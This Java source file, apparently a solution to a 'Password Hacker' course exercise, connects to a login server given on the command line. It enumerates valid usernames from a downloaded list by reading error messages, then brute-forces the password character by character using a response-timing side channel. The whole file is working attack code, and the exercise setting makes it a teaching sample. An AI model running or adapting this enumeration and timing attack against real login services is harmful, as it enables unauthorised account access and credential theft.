package hacker;

import com.google.gson.Gson;
import hacker.Json.Json;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class Main {
    // implementation 'com.google.code.gson:gson:2.8.8'

    public static void main(String[] args){

        try (Socket socket = new Socket(args[0], Integer.parseInt(args[1]));
             DataInputStream input = new DataInputStream(socket.getInputStream());
             DataOutputStream output = new DataOutputStream(socket.getOutputStream())
        ) {

            URL url = new URL("https://stepik.org/media/attachments/lesson/255258/logins.txt");
            Scanner sc = new Scanner(url.openStream(), StandardCharsets.UTF_8);
            Json json = new Json(null, "a");

            String userFound = "";

            while (sc.hasNextLine()) {
                String user = sc.nextLine();
                json.setLogin(user);

                output.writeUTF(jsonGenerator(json));
                String response = input.readUTF().toLowerCase();

                if (response.contains("wrong password") || response.contains("exception")){
                    userFound = user;
                    sc.close();
                    break;
                }
            }

            StringBuilder password = new StringBuilder();
            String string = "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789";
            json.setLogin(userFound);
            int index = 0;

            do {
                password.append(string.charAt(index));
                json.setPassword(password.toString());

                long requestTime = System.currentTimeMillis();
                output.writeUTF(jsonGenerator(json));
                String response = input.readUTF().toLowerCase();
                long elapsedTime = System.currentTimeMillis() - requestTime;

                if (response.contains("wrong")){
                    if (elapsedTime > 90){
                        index = 0;
                    } else {
                        index++;
                        password.deleteCharAt(password.length() - 1);
                    }
                } else if (response.contains("success")){
                    System.out.println(jsonGenerator(json));
                    output.close();
                    input.close();
                    break;
                }
            } while (true);

        } catch (IOException e) {
            e.getMessage();
        }
    }

    public static String jsonGenerator(Json json) {
        Gson gson = new Gson();

        return gson.newBuilder()
                .setPrettyPrinting()
                .create().toJson(json);
    }
}
